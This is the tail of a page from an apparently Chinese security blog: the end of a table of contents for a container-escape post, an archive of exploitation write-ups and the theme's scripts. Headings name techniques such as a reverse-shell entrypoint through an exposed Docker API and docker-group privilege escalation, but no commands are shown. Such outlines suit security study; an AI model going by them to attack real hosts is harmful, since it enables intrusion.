class="toc-text">配置不当</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#docker-http-api%E6%9A%B4%E9%9C%B2"><span class="toc-number">5.1.</span> <span class="toc-text">docker http api暴露</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE-7"><span class="toc-number">5.1.1.</span> <span class="toc-text">实验环境配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%99%85%E5%88%A9%E7%94%A8-7"><span class="toc-number">5.1.2.</span> <span class="toc-text">实际利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Entrypoint%E8%AE%BE%E7%BD%AE%E4%B8%BA%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">5.1.2.1.</span> <span class="toc-text">Entrypoint设置为反弹shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="toc-number">5.1.2.2.</span> <span class="toc-text">运行反弹shell的命令</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Docker%E7%94%A8%E6%88%B7%E7%BB%84%E6%8F%90%E6%9D%83"><span class="toc-number">5.2.</span> <span class="toc-text">Docker用户组提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE-8"><span class="toc-number">5.2.1.</span> <span class="toc-text">实验环境配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%99%85%E5%88%A9%E7%94%A8-8"><span class="toc-number">5.2.2.</span> <span class="toc-text">实际利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%951-%E6%8C%82%E8%BD%BD%E5%AE%BF%E4%B8%BB%E6%9C%BA%E6%A0%B9%E7%9B%AE%E5%BD%95"><span class="toc-number">5.2.2.1.</span> <span class="toc-text">方法1:挂载宿主机根目录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%952-%E6%B7%BB%E5%8A%A0%E4%B8%80%E4%B8%AA%E7%89%B9%E6%9D%83%E8%B4%A6%E6%88%B7"><span class="toc-number">5.2.2.2.</span> <span class="toc-text">方法2:添加一个特权账户</span></a></li></ol></li></ol></li></ol></li></ol>
            </div>
        
        <!-- sidebar -->
        <div class="sidebar sidebar-hide">
    <ul class="sidebar-tabs sidebar-tabs-active-0">
        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
    </ul>
    <div class="sidebar-content sidebar-content-show-archive">
        <div class="sidebar-panel-archives">
    <!-- 在 ejs 中将 archive 按照时间排序 -->
    
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
    
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
    
    
    
    
    <div class="total-and-search">
        <div class="total-archive">
        Total : 16
        </div>
        <!-- search  -->
        
    </div>
    
    <div class="post-archive">
    
        
            
            
            <div class="archive-year"> 2023 </div>
            <ul class="year-list">
            
        
        <li class="archive-post-item">
            <span class="archive-post-date">12/24</span>
            <a class="archive-post-title" href="/2023/12/24/qwb2023-chatting/">从fuzz视角看CTF堆题--qwb2023_chatting</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">12/23</span>
            <a class="archive-post-title" href="/2023/12/23/dnslog%E6%A3%80%E6%B5%8B%E8%BF%9C%E7%A8%8B%E4%BE%9D%E8%B5%96/">dnslog检测远程依赖</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">12/11</span>
            <a class="archive-post-title" href="/2023/12/11/fastjson%E5%BA%8F%E5%88%97%E5%8C%96/">fastjson序列化</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">12/03</span>
            <a class="archive-post-title" href="/2023/12/03/JNI/">JNI</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">11/29</span>
            <a class="archive-post-title" href="/2023/11/29/CVE-2022-21701%20yaml%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/">CVE-2022-21701 yaml解析漏洞</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">11/26</span>
            <a class="archive-post-title" href="/2023/11/26/jndi/">jndi注入</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">11/24</span>
            <a class="archive-post-title" href="/2023/11/24/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/">java动态代理</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">11/19</span>
            <a class="archive-post-title" href="/2023/11/19/CC%E9%93%BE/">CC链汇总</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">11/18</span>
            <a class="archive-post-title" href="/2023/11/18/%E5%BC%95%E7%94%A8%E7%BB%95%E8%BF%87/">java反序列化引用绕过</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">11/17</span>
            <a class="archive-post-title" href="/2023/11/17/CVE-2023-4357/">Chrome任意文件读->外带</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">11/16</span>
            <a class="archive-post-title" href="/2023/11/16/%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">java序列化\反序列化流程分析</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">11/15</span>
            <a class="archive-post-title" href="/2023/11/15/java%E5%88%9B%E9%80%A0%E5%AF%B9%E8%B1%A1/">java创造对象</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">11/14</span>
            <a class="archive-post-title" href="/2023/11/14/k8s/">k8s攻防</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">11/13</span>
            <a class="archive-post-title" href="/2023/11/13/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/">容器逃逸 All in One</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">11/12</span>
            <a class="archive-post-title" href="/2023/11/12/BUUCTF%E5%88%B7%E9%A2%98/">BUUCTF pwn刷题记录</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">11/11</span>
            <a class="archive-post-title" href="/index.html">Welcome</a>
        </li>
    
    </div>
</div>

        <div class="sidebar-panel-tags">
    <div class="sidebar-tags-name">
        
            <span class="sidebar-tag-name" data-tags="云安全">
                <span class="iconfont-archer">&#xe606;</span>
                云安全
            </span>
        
            <span class="sidebar-tag-name" data-tags="pwn">
                <span class="iconfont-archer">&#xe606;</span>
                pwn
            </span>
        
            <span class="sidebar-tag-name" data-tags="java">
                <span class="iconfont-archer">&#xe606;</span>
                java
            </span>
        
            <span class="sidebar-tag-name" data-tags="web">
                <span class="iconfont-archer">&#xe606;</span>
                web
            </span>
        
    </div>
    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
    </div> 
    <div class="sidebar-tags-list"></div>
</div>

        <div class="sidebar-panel-categories">
    <div class="sidebar-categories-name">
    
    </div>
    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
    <div class="sidebar-categories-list"></div>
</div>

    </div>
</div>

        <!-- site-meta -->
        <script>
    var siteMetaRoot = "/"
    if (siteMetaRoot === "undefined") {
        siteMetaRoot = '/'
    }
    var siteMeta = {
        url: "https://azraelxuemo.github.io",
        root: siteMetaRoot,
        author: "azraelxuemo"
    }
</script>

        <!-- import experimental options here -->
        <!-- Custom Font -->


        <!-- main func -->
        <script src="/scripts/main.js?v=20211217"></script>
        <!-- dark mode -->
        <script src="/scripts/dark.js?v=20211217"></script>
        <!-- fancybox -->
        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" defer></script>
        <!-- algolia -->
        
        <!-- busuanzi -->
        
            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
        
        <!-- CNZZ -->
        
        <!-- async load share.js -->
        
            <script src="/scripts/share.js?v=20211217" async></script>
        
        <!-- mermaid -->
        
    </body>
</html>
